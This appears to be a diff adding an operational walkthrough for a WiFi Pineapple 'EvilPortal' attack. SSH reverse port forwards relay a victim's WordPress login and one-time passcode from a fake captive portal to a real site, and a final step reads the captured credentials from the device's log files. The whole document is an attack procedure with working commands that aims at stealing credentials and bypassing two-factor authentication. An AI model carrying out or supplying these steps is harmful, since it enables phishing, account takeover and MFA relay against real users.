@@ -1,0 +1,112 @@
+1. Set up SSH Port Forwards on your host, to Relay Login Credentials and OTP Code
+
+┌──(selenium)─(kali㉿kali)-[~]
+└─$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet <your kali ip>  netmask 255.255.255.0  broadcast <your kali broadcast ip>
+        inet6 fe80::859e:b349:200c:7bfd  prefixlen 64  scopeid 0x20<link>
+        ether (NAT adapter mac address)  txqueuelen 1000  (Ethernet)
+        RX packets 10142  bytes 14597330 (13.9 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 944  bytes 93361 (91.1 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+┌──(kali㉿kali)-[~]
+└─$ sudo systemctl start ssh
+[sudo] password for kali: 
+
+
+PS C:\Users\user> ssh -L 8080:127.0.0.1:8080 kali@<your kali ip> -N
+
+PS C:\Users\user> ssh -R 9999:127.0.0.1:8080 root@172.16.42.1 -N
+
+PS C:\Users\user> ssh -R 9998:172.16.42.1:80 kali@<your kali ip> -N
+
+-------------------------------------------------------------------------------------------------------------
+2. Start the wordpress relay in Kali:
+
+┌──(selenium)─(kali㉿kali)-[~]
+└─$ vim wordpress-relay.py
+
+┌──(selenium)─(kali㉿kali)-[~]
+└─$ python3 wordpress-relay.py --domain your-domain.info
+
+-------------------------------------------------------------------------------------------------------------
+3. Connect WiFi Pineapple to internet
+
+a) Connect to the Admin Portal at 172.16.42.1:1471
+
+b) Connect to Internet
+    i.) Ethernet Connection: Superior to WiFi connection
+    ii.)  WiFi Connection: (Settings > Networking > select the Client Mode Interface (under Wireless Client Mode) > click Scan  > select your AP > enter the Network Password > Click "Connect")
+
+c) Perform an internet speed test to measure bandwidth (download/upload speeds).
+    i.) You can perform a speed test here: https://www.speedtest.net/
+
+-------------------------------------------------------------------------------------------------------------
+4. Connect to the Wifi Pineapple Access Point (from a Different Host)
+
+a) If using your phone, turn cellular data off first.
+
+b) Navigate to any HTTPs webpage other than google.com
+
+c) You should get an error: "Secure Connection Failed".
+
+d) You can also test your internet connection via the command line:
+
+┌──(kali㉿kali)-[~]
+└─$ curl -I https://google.com
+curl: (35) TLS connect error: error:0A0000C6:SSL routines::packet length too long
+
+-------------------------------------------------------------------------------------------------------------
+5. Relay the Wordpress Login from the Victim Browser
+
+a) Go to http://172.16.42.1/ in the victim browser.
+
+b) Submit the credentials (username and password).
+
+c) Check your email for the OTP code (if applicable).
+
+d) Enter the OTP code in the victim browser.
+
+e) You should be redirected to a page, indicating that internet access has been granted.
+
+-------------------------------------------------------------------------------------------------------------
+6. Confirm Internet Access was Granted
+
+a) Try navigating to any webpage (other than google.com).
+
+b) You should be able to resolve domains now, without the "Secure Connection Failed" error.
+
+c) You can also test your internet connection via the command line:
+
+┌──(kali㉿kali)-[~]
+└─$ curl -I https://google.com
+HTTP/2 301 
+location: https://www.google.com/
+content-type: text/html; charset=UTF-8
+content-security-policy-report-only: object-src 'none';base-uri 'self';script-src 'nonce-oqYtSmwnWkEB7eAMHBEx_w' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp
+date: Thu, 31 Jul 2025 20:43:53 GMT
+expires: Sat, 30 Aug 2025 20:43:53 GMT
+cache-control: public, max-age=2592000
+server: gws
+content-length: 220
+x-xss-protection: 0
+x-frame-options: SAMEORIGIN
+alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+d) If you still get the error "Secure Connection Failed":
+      i) Refresh the EvilPortal plugin page at "http://172.16.42.1:1471/#/Modules/evilportal" 
+      ii) Confirm the victim's IPv4 address has been added under "Allowed Clients".
+            a) Note: "Allowed Clients" is the private IP whitelist. The allowlist is cleared when the pineapple is restarted.
+
+e) The victim will not have internet access once the pineapple is restarted (this is the expected behavior).
+      i) If the victim still has internet access after a pineapple reboot, ensure EvilPortal is enabled on boot.
+
+-------------------------------------------------------------------------------------------------------------
+7. Verify the credentials were captured
+
+root@mk7:~# cat /root/logs/credentials.json
+
+root@mk7:~# cat /root/logs/capture
